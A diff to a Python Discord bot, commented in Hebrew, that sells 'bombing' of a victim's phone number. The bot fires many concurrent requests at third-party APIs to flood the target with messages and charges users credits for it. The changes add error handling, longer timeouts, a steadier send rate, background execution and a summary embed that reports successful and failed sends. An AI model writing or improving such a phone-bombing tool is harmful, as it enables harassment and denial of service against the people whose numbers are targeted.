@@ -14,8 +14,10 @@ DB_FILE = "credits_db.json"
 def load_data():
     if os.path.exists(DB_FILE):
         with open(DB_FILE, "r") as f:
-            data = json.load(f)
-            return {int(k): v for k, v in data.get("credits", {}).items()}, set(data.get("lifetime", []))
+            try:
+                data = json.load(f)
+                return {int(k): v for k, v in data.get("credits", {}).items()}, set(data.get("lifetime", []))
+            except: pass
     return {}, set()
 
 def save_data(credits, lifetime):
@@ -41,14 +43,14 @@ bot = MyBot()
 ADMIN_ROLE_NAME = "Owner"
 sem = asyncio.Semaphore(15) 
 
-# --- מנוע הספאם עם מונה הצלחות ---
+# --- מנוע הספאם המתוקן ---
 async def call_api(client, url, method, payload):
     async with sem:
         try:
             if method == "POST":
-                resp = await client.post(url, json=payload, timeout=3)
+                resp = await client.post(url, json=payload, timeout=4)
             else:
-                resp = await client.get(url, params=payload, timeout=3)
+                resp = await client.get(url, params=payload, timeout=4)
             return resp.is_success
         except:
             return False
@@ -72,13 +74,17 @@ async def send_spam(interaction, phone, seconds):
             results = await asyncio.gather(*tasks)
             success_count += results.count(True)
             fail_count += results.count(False)
-            await asyncio.sleep(2)
+            await asyncio.sleep(2.5) # קצב שליחה יציב
 
-    # שליחת סיכום פרטי למשתמש בסיום
-    await interaction.followup.send(
-        f"✅ **ההפצצה על {phone} הסתיימה!**\n📊 סיכום: {success_count} הצליחו | {fail_count} נכשלו.",
-        ephemeral=True
-    )
+    # שליחת הסיכום בסיום - השתמשנו ב-interaction.user.send כדי לוודא שזה מגיע
+    try:
+        embed = discord.Embed(title="📊 סיכום הפצצה", color=0x00ff00)
+        embed.add_field(name="📱 יעד", value=phone, inline=False)
+        embed.add_field(name="✅ הצלחות", value=str(success_count), inline=True)
+        embed.add_field(name="❌ כשלונות", value=str(fail_count), inline=True)
+        await interaction.followup.send(embed=embed, ephemeral=True)
+    except:
+        pass
 
 # --- ממשק משתמש ---
 class SpamModal(discord.ui.Modal, title='Spam-Me Control Panel'):
@@ -97,10 +103,10 @@ class SpamModal(discord.ui.Modal, title='Spam-Me Control Panel'):
                 user_credits[interaction.user.id] -= amt
                 save_data(user_credits, lifetime_users)
 
-            # הודעה ראשונית שרק המשתמש רואה
-            await interaction.response.send_message(f"🚀 מתחיל להפציץ את {self.phone.value}...", ephemeral=True)
+            # חשוב: אנחנו עושים defer כדי שה-interaction לא יפוג בזמן הספאם
+            await interaction.response.send_message(f"🚀 הפצצה על {self.phone.value} החלה...", ephemeral=True)
             
-            # הרצת הספאם
+            # הרצת הספאם ברקע
             asyncio.create_task(send_spam(interaction, self.phone.value, amt * 35))
         except:
             await interaction.response.send_message("❌ נא להזין מספר קרדיטים תקין.", ephemeral=True)
@@ -112,7 +118,7 @@ class ControlView(discord.ui.View):
     @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary)
     async def cr(self, i, b):
         bal = "Unlimited ♾️" if i.user.id in lifetime_users else user_credits.get(i.user.id, 0)
-        await i.response.send_message(f"💰 יתרה נוכחית: {bal}", ephemeral=True)
+        await i.response.send_message(f"💰 יתרה: {bal}", ephemeral=True)
 
 # --- פקודות ניהול ---
 @bot.tree.command(name="setup")
